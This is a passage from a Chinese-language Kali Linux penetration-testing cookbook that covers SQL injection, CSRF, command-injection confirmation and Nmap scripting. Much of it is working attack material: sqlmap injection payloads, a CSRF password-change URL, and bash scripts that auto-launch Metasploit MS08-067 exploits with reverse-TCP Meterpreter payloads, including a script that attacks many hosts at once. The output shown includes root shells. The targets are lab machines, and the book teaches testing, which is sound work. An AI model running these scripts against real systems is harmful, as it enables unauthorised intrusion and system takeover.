  \ UNION query (NULL) - 2 columns`\n`Payload: id=test_here' UNION ALL SELECT NULL,CONCAT(0x3a6f63723a,0x67`\n\
  `744e67787a6157674e,0x3a756c753a)#&Submit=Submit`\n398\n\n*第 7 章*\n\n`Type: AND/OR\
  \ time-based blind`\n`Title: MySQL < 5.0.12 AND time-based blind (heavy query)`\n\
  `Payload: id=test_here' AND 4329=BENCHMARK(5000000,MD5(0x486a7a4a))`\n`AND 'ARpD'='ARpD&Submit=Submit`\n\
  \n`sqlmap` 能够测试请求捕获中识别出的所有 GET 方法参数。在这里，我们可以看到 `ID` 参数存在多种 SQL 注入漏洞。\n\n### 工作原理……\n\
  \n`sqlmap` 能够通过解析请求的内容并识别任何可评估的参数来接受捕获的请求。这有效地使得 `sqlmap` 在启动时无需花费额外精力转录执行攻击所需的全部参数。\n\
  \n### 自动化 CSRF 测试\n\n跨站请求伪造（CSRF）是最容易被误解的 Web 漏洞之一。尽管如此，未能正确识别此类漏洞可能会对 Web 应用及其用户带来严重风险。在本教程中，我们将讨论如何对\
  \ GET 和 POST 方法参数进行 CSRF 漏洞测试。\n\n### 准备工作\n\n要对目标进行 CSRF 测试，你需要一个运行一个或多个受 CSRF\
  \ 影响 Web 应用的远程系统。在提供的示例中，使用了 `Metasploitable2` 实例执行此任务。`Metasploitable2` 在 TCP 端口\
  \ `80` 上运行着几个预装的漏洞 Web 应用。有关设置 `Metasploitable2` 的更多信息，请参阅本书第 1 章*入门*中的*安装 Metasploitable2*\
  \ 教程。\n\n### 如何操作……\n\nCSRF 是一种可能存在于 GET 和 POST 方法事务中的漏洞。`DVWA` 提供了一个 GET 方法 CSRF\
  \ 漏洞的良好示例。应用程序允许用户通过 GET 方法参数多次提交新值来更新密码，如下：\n\n```\nGET /dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change\
  \ HTTP/1.1\nHost: 172.16.36.135\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0)\
  \ Gecko/20100101\nFirefox/18.0 Iceweasel/18.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\
  Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://172.16.36.135/dvwa/vulnerabilities/csrf/\n\
  Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c\n```\n\n由于缺乏 CSRF\
  \ 控制，利用此漏洞非常容易。如果 Web 应用程序的用户被诱导访问带有预配置的 `password_new` 和 `password_conf` 参数值的 URL，攻击者就可以强制受害者将密码更改为攻击者选择的密码。以下\
  \ URL 是该利用利用的示例：\n\n```\nhttp://172.16.36.135/dvwa/vulnerabilities/csrf/?password_new=compromised&password_conf=compromised&Change=Change#\n\
  ```\n\n如果受害者点击了此链接，他们的密码将被更改为 compromised。\n\n然而，利用 CSRF 漏洞很少有那么简单。这是因为大多数开发者至少具有安全意识，不会使用\
  \ GET 方法参数执行安全事务。一个易受 POST 方法 CSRF 影响的应用程序良好示例是 `Mutillidae` 应用程序的博客功能，所示：\n\n```\n\
  POST /mutillidae/index.php?page=add-to-your-blog.php HTTP/1.1\nHost: 172.16.36.135\n\
  User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101\nFirefox/18.0\
  \ Iceweasel/18.0.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\
  Accept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://172.16.36.135/dvwa/vulnerabilities/csrf/\n\
  Cookie: security=low; PHPSESSID=8aa4a24cd6087911eca39c1cb95a7b0c\n```\n\n399\n*Web\
  \ 扫描*\n\n\n\n\n大多数攻击者寻求利用漏洞，并希望最终能找到在底层操作系统上执行任意命令的方法。命令执行漏洞在不需要任何额外步骤的情况下提供了这种能力。在本教程中，我们将讨论如何使用\
  \ Web 服务器日志或自定义的 Web 服务脚本来确认命令执行漏洞。\n\n### 准备工作\n\n要使用 HTTP 请求确认来对目标进行命令注入测试，你需要一个远程系统，该系统运行着一个或多个易受命令注入攻击的\
  \ Web 应用程序。在提供的示例中使用了 `Metasploitable2` 实例来执行此任务。`Metasploitable2` 在 TCP 端口 `80`\
  \ 上运行着几个预装的易受漏洞 Web 应用程序。有关如何设置 `Metasploitable2` 的更多信息，请参阅本书书第 1 章“入门指南”中的`安装 Metasploitable2`\
  \ 教程。\n\n此外，本节还需要使用如 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参阅本书书第 1 章“入门指南”中的`使用文本编辑器（VIM`\
  \ 和 `Nano）` 教程。\n\n### 如何操作……\n\n通过执行强制后端系统与你拥有的 Web 服务器交互的命令，可以验证 Web 应用程序中的命令注入漏洞。可以轻松检查日志以寻找漏洞服务器已与其交互的证据。\n\
  \n或者，可以编写一个自定义脚本来生成一个临时的 Web 服务，该服务可以监听外部连接并打印接收到的请求。以下是一个此此 Python 脚本示例：\n\n```python\n\
  #!/usr/bin/python\n\nimport socket\n\nhttprecv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
  httprecv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nhttprecv.bind((\"\
  0.0.0.0\",8000))\nhttprecv.listen(2)\n(client, ( ip,sock)) = httprecv.accept()\n\
  print \"Received connection from : \", ip\ndata = client.recv(4096)\nprint str(data)\n\
  client.close()\nhttprecv.close()\n```\n\n脚本执行后，我们需要强制目标服务器与监听的服务交互以确认命令注入漏洞。DVWA\
  \ 应用程序有一个 `ping` 工具，可以用于 `ping` 提供的 IP 地址。用户输入被直接传递给系统调用，并可以被修改在底层操作系统中执行任意命令。我们可以通过使用分号跟随每个后续命令来追加多个命令，如下截图所示：\n\
  \n在提供的示例中，输入的内容为 `ping 127.0.0.1`，并对 `http://172.16.36.224:8000` 执行 `wget` 请求。该\
  \ `wget` 请求对应于临时的监听 Python 服务。在提交输入后，我们可以参考脚本的输出来验证命令已执行，如下：\n\n```root@KaliLinux:~#\
  \ ./httprecv.py\nReceived connection from : 172.16.36.135\nGET / HTTP/1.0\nUser-Agent:\
  \ Wget/1.10.2\nAccept: */***\nHost: 172.16.36.224:8000\nConnection: Keep-Alive\n\
  ```\n\n在这里，我们可以看到从目标 Web 服务器接收到了连接，并且用于访问 Web 服务的 user-agent 是 `wget`。如果没有安装 `wget`，`Curl`\
  \ 是另一个可选的替代方案。\n\n### 工作原理……\n\n该 Python 脚本之所以能确认命令注入漏洞，因为它证明了命令可以通过来自不同系统的注入有效载从目标服务器上执行。在有效载被注入到服务器的同时，同时执行类似请求的可能性极低。然而，即使担心有效载不是检测到的流量的真实源头，也可以轻松进行多次尝试以消除对误报的顾虑。\n\
  \n## 使用 ICMP 流量验证命令注入漏洞\n\n命令注入可能是所有已知 Web 应用程序攻击向量中最危险的一种。大多数攻击者寻求利用漏洞，并希望最终能找到在底层操作系统上执行任意命令的方法。命令执行漏洞在不需要任何额外步骤的情况下提供了这种能力。在本教程中，我们将讨论如何编写一个自定义脚本，使用\
  \ ICMP 流量验证远程代码执行漏洞。\n\n### 准备工作\n\n要使用 ICMP Echo 请求确认来对目标进行命令注入测试，你需要一个远程系统，该系统运行着一个或多个易受命令注入攻击的\
  \ Web 应用程序。在提供的示例中使用了 `Metasploitable2` 实例来执行此任务。`Metasploitable2` 在 TCP 端口 `80`\
  \ 上运行着几个预装的易受漏洞 Web 应用程序。有关如何设置 `Metasploitable2` 的更多信息，请参阅本书书第 1 章“入门指南”中的`安装 Metasploitable2`\
  \ 教程。\n\n此外，本节还需要使用如 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参阅本书书第 1 章“入门指南”中的`使用文本编辑器（VIM`\
  \ 和 `Nano）` 教程。\n\n### 如何操作……\n\n通过执行强制后端系统向监听服务发送 ICMP 流量的命令，可以验证 Web 应用程序中的命令注入漏洞。接收到的\
  \ ICMP Echo 请求可用于识别易漏洞系统。以下是一个使用 Scapy 库实现此目的的 Python 脚本示例：\n\n```python\n#!/usr/bin/python\n\
  \nimport logging\nlogging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n\
  from scapy.all import *\n\ndef rules(pkt):\n    try:\n        if (pkt[IP].dst==\"\
  172.16.36.224\") and (pkt[ICMP]):\n            print str(pkt[IP].src) + \" is exploitable\"\
  \n    except:\n        pass\n\nprint \"Listening for Incoming ICMP Traffic. Use\
  \ Ctrl+C to stop listening\"\nsniff(lfilter=rules,store=0)\n```\n\n执行 ICMP 监听后，我们需要尝试从漏洞服务器向我们的监听服务启动\
  \ ICMP Echo 请求。这可以通过向易受命令注入的用户输入中注入 `ping` 命令来实现。在 Mutillidae 中，有一个漏洞函数通过将用户输入传递给直接系统调用执行\
  \ DNS 枚举。可以使用分号向用户输入追加一个独立的 ping 请求。\n\n假设服务器易受命令注入，Python 监听器应指示已接收 ICMP Echo 请求，并且目标服务器可能存在漏洞，如下：\n\
  \n```root@KaliLinux:~# ./listener.py\nListening for Incoming ICMP Traffic. Use Ctrl+C\
  \ to stop listening\n172.16.36.135 is exploitable\n```\n\n### 工作原理……\n\n该 Python\
  \ 脚本之所以能确认命令注入漏洞，因为它证明了命令可以通过来自不同系统的注入有效载从目标服务器上执行。在有效载被注入到服务器的同时，同时执行类似请求的可能性极低。然而，即使担心有效载不是检测到的流量的真实源头，也可以轻松进行多次尝试以消除对误报的顾虑。\n\
  \n\n\n\n\nKali Linux 渗透测试平台提供了大量高效工具，可以完成企业渗透测试期间所需的大多数常见任务。然而，在某些情况下，单个工具不足以完成给定的任务。与其构建完全全新的脚本或程序来完成挑战性任务，通常编写利用现有工具并/或根据需要修改其行为的脚本往往更为有效。\n\
  \n实用的自定义脚本类型包括：用于分析或管理现有工具输出的脚本、将多个工具组合，或者对原本需要顺序执行的任务进行多线程处理。本章包含以下自动化和操作现有 Kali\
  \ Linux 工具的配方：\n\n- Nmap greppable 输出分析\n- 带有针对性 NSE 脚本执行的 Nmap 端口扫描\n- 结合 MSF 化的\
  \ Nmap NSE 漏洞扫描\n- 结合 MSF 化的 Nessuscmd 漏洞扫描\n- 使用反向 Shell 负载的多线程 MSF 注入\n- 使用后门可执行文件多线程\
  \ MSF 注入\n- 带有 ICMP 验证的多线程 MSF 注入\n- 带有管理员账户的多线程 MSF 注入\n\n## Nmap greppable 输出分析\n\
  \n大多数安全专业人员认为 `Nmap` 是 Kali Linux 平台上最精良且最有效的工具之一。但尽管这个工具非常令人印象深刻且强大，全面的端口扫描和服务识别可能非常耗时。与其在整个渗透测试过程中针对不同的服务端口进行针对性扫描，更优的方法是对所有可能的\
  \ TCP 和 UDP 服务进行全面扫描，然后在整个评估过程中直接引用这些结果。`Nmap` 提供了 XML 和 greppable（可 grep 的）输出格式来帮助这一过程。\n\
  \n*自动化 Kali 工具*\n\n理想情况下，你应该足够熟悉这些格式，以便根据需要从输出文件中提取所需信息。然而，为了供你参考，本配方将提供一个示例脚本，该脚本可用于提取所有识别为在指定端口运行服务的\
  \ IP 地址。\n\n### 准备工作\n\n要使用本配方中演示的脚本，你需要让 `Nmap` 结果以 greppable 格式输出结果。这可以通过执行 `Nmap`\
  \ 端口扫描并使用 `-oA` 选项输出所有格式，或使用 `-oG` 专门输出 greppable 格式来获得。在提供的示例中，对单个 `/24` 子网扫描了多个系统，包括\
  \ Windows XP 和 Metasploitable2。有关设置 Metasploitable2 的更多信息，请参考本书“第一章”`入门指南`中的 `安装\
  \ Metasploitable2` 配方。有关设置 Windows 系统的更多信息，请参考本书“第一章”`入门指南`中的 `安装 Windows Server`\
  \ 配方。此外，本节还需要使用如 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参考本书“第一章”`入门指南`中的 `使用文本编辑器\
  \ (VIM and Nano)` 配方。\n\n### 如何操作……\n\n接下来的示例演示了使用 bash 脚本语言甚至 bash 命令行界面 (CLI)\
  \ 方便地从 `Nmap` 输出的 greppable 格式中提取信息：\n\n```bash\n#! /bin/bash\n\nif [ ! $1 ]; then\
  \ echo \"Usage: #./script <port #> <filename>\";\nexit; fi\n\nport=$1\nfile=$2\n\
  \necho \"Systems with port $port open:\"\n\ngrep $port $file | grep open | cut -d\
  \ \" \" -f 2\n```\n\n为了确保理解脚本的功能，我们将顺序解释每一行。\n\n脚本的第一行仅指向 bash 解释器，以便脚本可以独立执行。脚本的第二行是一个\
  \ `if...then` 条件语句，用于测试是否为脚本提供了任何参数。这只是基本的输入验证，以确保用户了解工具的用法。如果在执行工具时未提供任何参数，脚本将回显用法描述并退出。用法描述请求两个参数，包括端口号和文件名。\n\
  \n接下来的两行将每个输入值赋值给更易理解的变量。第一个输入值是端口号，第二个输入值是 `Nmap` 输出文件。然后脚本将检查 `Nmap` greppable\
  \ 输出文件，以确定哪些系统（如果有的话）在给定的端口号上运行服务：\n\n```bash\nroot@KaliLinux:~# ./service_identifier.sh\n\
  Usage: #./script <port #> <filename>\n```\n\n当不带任何参数执行脚本时，会输出用法描述。要使用该脚本，我们需要输入一个要检查的端口号以及\
  \ `Nmap` greppable 输出文件的文件名。在提供的示例中，对 `/24` 网络进行了扫描，并生成了名为 `netscan.txt` 的 greppable\
  \ 输出文件。然后使用该脚本分析此文件，并确定其中是否发现了任何在各个端口上有活动服务的主机。\n\n```bash\nroot@KaliLinux:~# ./service_identifier.sh\
  \ 80 netscan.txt\nSystems with port 80 open:\n172.16.36.135\n172.16.36.225\n```\n\
  \n```bash\nroot@KaliLinux:~# ./service_identifier.sh 22 netscan.txt\nSystems with\
  \ port 22 open:\n172.16.36.135\n172.16.36.225\n172.16.36.239\n```\n\n```bash\nroot@KaliLinux:~#\
  \ ./service_identifier.sh 445 netscan.txt\nSystems with port 445 open:\n172.16.36.135\n\
  172.16.36.225\n```\n\n在所示示例中，运行脚本是为了确定运行在 80、22 和 445 端口上的主机。脚本的输出声明了正在评估的端口号，然后列出输出中具有活动服务的系统\
  \ IP 地址。\n\n### 工作原理……\n\n`grep` 是一个功能非常强大的命令行实用，可以在 bash 中用于从输出或文件中提取特定内容。在本配方提供的脚本中，`grep`\
  \ 用于从输出中提取任何给定端口号的实例。由于 `grep` 函数的输出包含多个部分信息，随后输出通过管道传递给 `cut` 函数提取 IP 地址，然后将其输出到终端。\n\
  \n## 带有针对性 NSE 脚本执行的 Nmap 端口扫描\n\n许多 Nmap 脚本引擎 (NSE)脚本仅在给定端口上有运行服务时才适用。考虑 `smb-check-vulns.nse`\
  \ 脚本的使用。该脚本将评估运行在 TCP 445 端口上的 SMB 服务是否存在常见的服务漏洞。\n\n如果在整个网络上执行此脚本，它必须重新完成确定 445\
  \ 端口是否开放以及每个目标系统是否可以访问 SMB 服务的任务。这个任务可能在评估的扫描阶段已经完成。可以使用 bash 脚本利用现有的 Nmap greppable\
  \ 输出文件，仅针对运行相应服务的系统运行特定服务的 NSE 脚本。在本配方中，我们将演示如何使用脚本从先前的扫描结果确定在 TCP 445 上运行服务的主机，然后仅对这些系统运行\
  \ `smb-check-vulns.nse` 脚本。\n\n\n\n\n\nWindows 系统请参阅本书中 `第 1 章` `入门` 中的 `安装 Windows\
  \ Server` 教程。此外，本节将要求使用 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参阅本书中 `第 1 章`\
  \ `入门` 中的 `使用文本编辑器（VIM 和 Nano）` 教程。\n\n## 如何实现…\n\n接下来的示例演示了如何使用 bash 脚本将多个任务串联在一起。在这种情况下，对\
  \ `Nmap` 的 grep 格式输出文件进行分析，然后利用该任务识别出的信息对不同的系统执行 `Nmap` NSE 脚本。具体而言，第一个任务将确定哪些系统在\
  \ `TCP 445` 上运行了服务，然后对这些系统每一个运行 `smb-check-vulns.nse` 脚本。\n\n```bash\n#! /bin/bash\n\
  \nif [ ! $1 ]; then echo \"Usage: #./script <file>\"; exit; fi\n\nfile=$1\n\nfor\
  \ x in $(grep open $file | grep 445 | cut -d \" \" -f 2);\ndo nmap --script smb-check-vulns.nse\
  \ -p 445 $x --script-args=unsafe=1;\ndone\n```\n\n为了确保理解脚本的功能，我们将按顺序解释每一行代码。前几行与上一个教程中讨论的脚本相似。第一行指向\
  \ bash 解释器，第二行检查是否提供了参数，第三行将输入值分配给易理解的变量名。\n\n然而，脚本的主体非常不同。使用 `for` 循环来遍历通过 `grep`\
  \ 函数获取的 IP 地址列表。`grep` 函数输出的 IP 地址列表对应于所有在 `TCP 端口 445` 上运行服务的系统。\n\n对于这些 IP 地址中的每一个，随后将执行\
  \ `Nmap` NSE 脚本。通过仅在之前已识别出在 `TCP 445` 上运行服务的系统上运行此脚本，可以大幅缩短运行 NSE 扫描所需的时间。\n\n```bash\n\
  root@KaliLinux:~# ./smb_eval.sh\nUsage: #./script <file>\n```\n\n通过不带任何参数执行脚本，脚本将输出用法说明。该描述指示应提供一个现有\
  \ `Nmap` grep 格式输出文件的文件名。当提供了该输出文件时，脚本将快速分析文件以找到任何在 `TCP 445` 上运行服务的系统，然后对这些系统每一个运行\
  \ NSE 脚本并将结果输出到终端。\n\n```bash\nroot@KaliLinux:~# ./smb_eval.sh netscan.txt\nStarting\
  \ Nmap 6.25 ( http://nmap.org ) at 2014-04-10 05:45 EDT\nNmap scan report for 172.16.36.135\n\
  Host is up (0.00035s latency).\nPORT STATE SERVICE\n445/tcp open microsoft-ds\n\
  MAC Address: 00:0C:29:3D:84:32 (VMware)\nHost script results:\n| smb-check-vulns:\n\
  | Conficker: UNKNOWN; not Windows, or Windows with disabled browser service (CLEAN);\
  \ or Windows with crashed browser service (possibly INFECTED).\n| | If you know\
  \ the remote system is Windows, try rebooting it and scanning | |_ again. (Error\
  \ NT_STATUS_OBJECT_NAME_NOT_FOUND)\n| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE\n\
  | MS06-025: NO SERVICE (the Ras RPC service is inactive)\n|_ MS07-029: NO SERVICE\
  \ (the Dns Server RPC service is inactive)\nNmap done: 1 IP address (1 host up)\
  \ scanned in 5.21 seconds\nStarting Nmap 6.25 ( http://nmap.org ) at 2014-04-10\
  \ 05:45 EDT\nNmap scan report for 172.16.36.225\nHost is up (0.00041s latency).\n\
  PORT STATE SERVICE\n445/tcp open microsoft-ds\nMAC Address: 00:0C:29:18:11:FB (VMware)\n\
  Host script results:\n| smb-check-vulns:\n| MS08-067: VULNERABLE\n| Conficker: Likely\
  \ CLEAN\n| regsvc DoS: NOT VULNERABLE\n| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE\n\
  | MS06-025: NO SERVICE (the Ras RPC service is inactive)\n|_ MS07-029: NO SERVICE\
  \ (the Dns Server RPC service is inactive)\nNmap done: 1 IP address (1 host up)\
  \ scanned in 5.18 seconds\n```\n\n在提供的示例中，脚本被传递给 `netscan.txt` 输出文件。在对文件进行快速分析后，脚本确定两个系统在端口\
  \ 445 上运行服务。这些服务中的每一个都使用 `smb-check-vulns.nse` 脚本进行了扫描，并在终端生成了输出。\n\n## 工作原理…\n\n\
  通过将 `grep` 序列作为 `for` 循环使用的值，本教程中的 bash 脚本本质上只是遍历该函数的输出。通过独立运行该函数，可以发现它只是提取了对应运行\
  \ SMB 服务的主机的 IP 地址列表。然后 `for` 循环遍历这些 IP 地址并为每个地址执行 NSE 脚本。\n\n## 使用 MSF 利用进行 Nmap\
  \ NSE 漏洞扫描\n\n在某些情况下，开发一个结合漏洞扫描与利用的脚本可能会很有帮助。漏洞扫描往往会产生误报，因此通过对漏洞扫描结果进行后续的利用，可以对这些结果的真实性进行即时验证。在本教程中，将使用\
  \ bash 脚本执行 `smb-check-vulns.nse` 脚本，以判断主机是否易受 `MS08-067` NetAPI 漏洞利用的影响，如果 NSE\
  \ 脚本显示存在，则将使用 Metasploit 自动尝试对其进行利用以验证。\n\n### 准备工作\n\n要使用本教程中演示的脚本，你需要访问一个运行有漏洞服务的系统，该服务可以使用\
  \ `Nmap` NSE 脚本识别，并可以使用 Metasploit 进行利用。在提供的示例中，使用了一个运行 SMB 服务的 Windows XP 系统，该服务易受\
  \ `MS08-067` NetAPI 漏洞利用的影响。有关设置 Windows 系统的更多信息，请请参阅本书中 `第 1 章` `入门` 中的 `安装 Windows\
  \ Server` 教程。此外，本节将要求使用 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参阅本书中 `第 1 章`\
  \ `入门` 中的 `使用文本编辑器（VIM 和 Nano）` 教程。\n\n### 如何实现…\n\n接下来的示例演示了如何使用 bash 脚本将漏洞扫描和目标利用的任务任务串联在一起。在这种情况下，使用\
  \ `smb-check-vulns.nse` 脚本来确定系统是否易受 `MS08-067` 攻击的影响，如果发现漏洞，则对该系统执行相应的 Metasploit\
  \ 利用程序。\n\n```bash\n#! /bin/bash\n\nif [ ! $1 ]; then echo \"Usage: #./script <RHOST>\
  \ <LHOST> <LPORT>\"; exit; fi\n\nrhost=$1\nlhost=$2\nlport=$3\n\nnmap --script smb-check-vulns.nse\
  \ -p 445 $rhost --script-args=unsafe=1 -oN tmp_output.txt\n\nif [ $(grep MS08-067\
  \ tmp_output.txt | cut -d \" \" -f 5) = \"VULNERABLE\" ];\nthen\n  echo \"$rhost\
  \ appears to be vulnerable, exploiting with Metasploit...\"\n  msfcli exploit/windows/smb/ms08_067_netapi\
  \ PAYLOAD=windows/meterpreter/reverse_tcp RHOST=$rhost LHOST=$lhost LPORT=$lport\
  \ E;\nfi\n\nrm tmp_output.txt\n```\n\n\n\n\n第一行定义了解释器，第二行用于测试输入，第三、四、五行均用于根据用户输入定义变量。在此脚本中，提供的用户变量对应于\
  \ Metasploit 中使用的变量。`RHOST` 变量应定义目标的 IP 地址，`LHOST` 变量应定义反向监听器的 IP 地址，而 `LPORT` 变量应定义正在监听的本地端口。脚本在正文中随后执行的第一个任务是针对由\
  \ `RHOST` 输入定义的目标系统 IP 地址执行 `smb-check-vulns.nse` 脚本。该操作的 own 随后将以普通格式输出到一个临时文本文件中。随后，使用一个\
  \ `if...then` 条件语句并配合 `grep` 函数来测试输出文件中是否包含一个能够指示系统存在漏洞的唯一字符串。如果发现了该唯一字符串，脚本将指示系统似乎存在漏洞，并使用\
  \ Metasploit 框架命令行界面 (`MSFCLI`) 执行 Metasploit 漏洞利用（exploit）和 Meterpreter 负载（payload）。最后，在启动漏洞利用后，使用\
  \ `rm` 函数从文件系统中删除临时的 Nmap 输出文件。`test_n_xploit.sh` bash 命令的执行如下：\n\n```bash\nroot@KaliLinux:~#\
  \ ./test_n_xploit.sh\nUsage: #./script <RHOST> <LHOST> <LPORT>\n```\n\n如果执行脚本时未提供任何参数，脚本将输出相应的用法说明。该用法说明将指示执行脚本时应按顺序带有\
  \ `RHOST`、`LHOST` 和 `LPORT` 参数。这些输入值将分别用于 Nmap NSE 漏洞扫描，以及在需要时使用 Metasploit 在目标系统上执行漏洞利用。在接下来的示例中，该脚本被用于确定\
  \ IP 地址为 `172.16.36.225` 的主机是否存在漏洞。如果确定该系统存在漏洞，则将启动漏洞利用，并连接到在 IP 地址为 `172.16.36.239`\
  \ 的系统上通过 TCP 端口 `4444` 正在监听的反向 TCP Meterpreter 处理器。\n\n```bash\nroot@KaliLinux:~#\
  \ ./test_n_xploit.sh 172.16.36.225 172.16.36.239 4444\nStarting Nmap 6.25 ( http://nmap.org\
  \ ) at 2014-04-10 05:58 EDT\nNmap scan report for 172.16.36.225\nHost is up (0.00077s\
  \ latency).\nPORT STATE SERVICE\n445/tcp open microsoft-ds\nMAC Address: 00:0C:29:18:11:FB\
  \ (VMware)\nHost script results:\n| smb-check-vulns:\n| MS08-067: VULNERABLE\n|\
  \ Conficker: Likely CLEAN\n| regsvc DoS: NOT VULNERABLE\n| SMBv2 DoS (CVE-2009-3103):\
  \ NOT VULNERABLE\n| MS06-025: NO SERVICE (the Ras RPC service is inactive)\n|_ MS07-029:\
  \ NO SERVICE (the Dns Server RPC service is inactive)\nNmap done: 1 IP address (1\
  \ host up) scanned in 5.61 seconds\n172.16.36.225 appears to be vulnerable, exploiting\
  \ with Metasploit...\n[*] Please wait while we load the module tree...\n, ,\n/ \\\
  \n((__---,,,---__))\n(_) O O (_)_________\n\\ _ / |\\\no_o \\ M S F | \\\n\\\n```\n\
  \n\n\n需要在返回的输出中识别插件 ID。如果输出中返回了插件 ID，表示系统存在漏洞，则会执行相应的 Metasploit 利用模块。\n\n```bash\n\
  root@KaliLinux:~# ./nessuscmd_xploit.sh\nUsage: #./script <RHOST>\n```\n\n417\n\n\
  *Kali 工具自动化*\n\n如果在执行脚本时未提供任何参数，脚本将将输出适当的用法说明。该用法说明将指示用户应通过带有 `RHOST` 参数执行脚本，用以定义目标\
  \ IP 地址。此输入值将同时用于 `Nessuscmd` 漏洞扫描以及在必要时使用 Metasploit 在目标系统上执行漏洞利用。在下面的示例中，该脚本被用于确定\
  \ IP 地址为 `172.16.36.135` 的主机是否存在漏洞。如果确定系统存在漏洞，将自动启动漏洞利用并建立与后门的连接。\n\n```bash\nroot@KaliLinux:~#\
  \ ./nessuscmd_xploit.sh 172.16.36.135\n172.16.36.135 appears to be vulnerable, exploiting\
  \ with Metasploit...\n[*] Initializing modules...\nPAYLOAD => cmd/unix/interact\n\
  RHOST => 172.16.36.135\n[*] Banner: 220 (vsFTPd 2.3.4)\n[*] USER: 331 Please specify\
  \ the password.\n[+] Backdoor service has been spawned, handling...\n[+] UID: uid=0(root)\
  \ gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (172.16.36.232:48126\
  \ -> 172.16.36.135:6200) at 2014-04-28 00:29:21 -0400\nwhoami\nroot\ncat /etc/passwd\n\
  root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n\
  sys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\n****TRUNCATED}****\n\
  ```\n\n由于 `Nessuscmd` 的输出被重定向到临时文件而不是使用集成输出函数，因此脚本不会返回任何输出来指示扫描是否成功，除了指示系统似乎存在漏洞且\
  \ Metasploit 正在尝试利用的字符串外。一旦脚本完成，目标系统将返回一个具有 root 权限的交互式 shell。为了演示这一点，我们同时使用了 `whoami`\
  \ 和 `cat` 命令。\n\n418\n\n*第 8 章*\n\n### 工作原理……\n\n`Nessuscmd` 是 `Nessus` 漏洞扫描器自带的一个命令行工具。该工具可以通过直接从终端执行针对性扫描，来扫描并评估不同插件的结果。由于此工具像\
  \ `MSFCLI` 一样可以很容易地从 `bash` 终端调用，因此很容易编写脚本将这两个任务序列化起来，从而将漏洞扫描与漏洞利用相结合。\n\n## 使用反向\
  \ shell 负载进行多线程 MSF 利用\n\n使用 `Metasploit` 框架进行大型渗透测试的困难之一是，每个利用程序都必须逐个按顺序运行。在您希望确认大量系统中单个漏洞的可利用性时，逐个对每个系统进行利用的任务可能会变得枯燥且令不从心。幸运的是，通过结合\
  \ `MSFCLI` 和 `bash` 脚本的力量，可以通过运行单个脚本同时在多个系统上执行漏洞利用。本教程将演示如何使用 `bash` 在多个系统上利用同一个漏洞，并为每个系统打开一个\
  \ `Meterpreter` shell。\n\n### 准备工作\n\n要使用本教程演示的脚本，你需要访问多个系统，且每个系统都具有可以使用 `Metasploit`\
  \ 利用的相同漏洞。在提供的示例中，复制了一个运行有漏洞版本 `Windows XP` 的虚拟机，生成了三个 `MS08-067` 漏洞实例。有关设置 Windows\
  \ 系统的更多信息，请参阅本书第 1 章“入门”部分中的*安装 Windows Server* 教程。此外，本节还需要使用 `VIM` 或 `Nano` 等文本编辑器将脚本写入文件系统。有关编写脚本的更多信息，请参阅本书第\
  \ 1 章“入门”部分中的*使用文本编辑器 (VIM and Nano)* 教程。\n\n## 如何实现……\n\n接下来的示例演示了如何使用 `bash` 脚本同时利用同一个漏洞的多个实例。该脚本可以通过引用\
  \ IP 地址输入列表，专门利用多个 `MS08-067` `NetAPI` 漏洞实例：\n\n```bash\n#!/bin/bash\n\nif [ ! $1\
  \ ]; then echo \"Usage: #./script <host file> <LHOST>\";\nexit; fi\n\niplist=$1\n\
  lhost=$2\ni=4444\n\nfor ip in $(cat $iplist)\ndo\n  gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi\
  \ PAYLOAD=windows/meterpreter/reverse_tcp RHOST=$ip LHOST=$lhost LPORT=$i echo \"\
  Expliting $ip\"\n  i=$((i+1))\ndone\n```\n\n脚本使用 `for` 循环为输入列表中的每个 IP 地址执行 `gnome-terminal`。这些终端中的每一个将运行\
  \ `msfcli`，以便同时对多个系统进行利用。本地端口 `i` 初始化为 `4444`，并且每增加一个系统就递增 `1`。可以如下所示执行：\n\n```bash\n\
  root@KaliLinux:~# ./multipwn.sh\nUsage: #./script <host file> <LHOST>\n\nroot@KaliLinux:~#\
  \ ./multipwn.sh iplist.txt 172.16.36.239\nExpliting 172.16.36.132\nport 4444\nExpliting\
  \ 172.16.36.158\nport 4445\nExpliting 172.16.36.225\nport 4446\n```\n\n419\n\n*Kali\
  \ 工具自动化*\n\n\n\n\n[*] 正在发送 (752128 字节) 到 172.16.36.225\n[*] Meterpreter 会话 1 已打开\
  \ (172.16.36.239:4446 -> 172.16.36.225:1950) 时间 2014-04-10 07:12:44 -0400\nmeterpreter\
  \ > getuid\nServer 用户名: NT AUTHORITY\\SYSTEM\nmeterpreter >\n\n### 自动化 Kali 工具\n\
  \n每个独立的终端都会启动 `MSFCLI` 的独立实例并运行漏洞利用程序。假设漏洞利用成功，将执行有效载负载（payload），并且每个独立的终端中都将获得一个交互式的\
  \ `Meterpreter` 壳。\n\n### 工作原理……\n\n通过为每个进程使用独立的终端，可以使用单个 `bash` 脚本执行多个并行漏洞利用。此外，通过为\
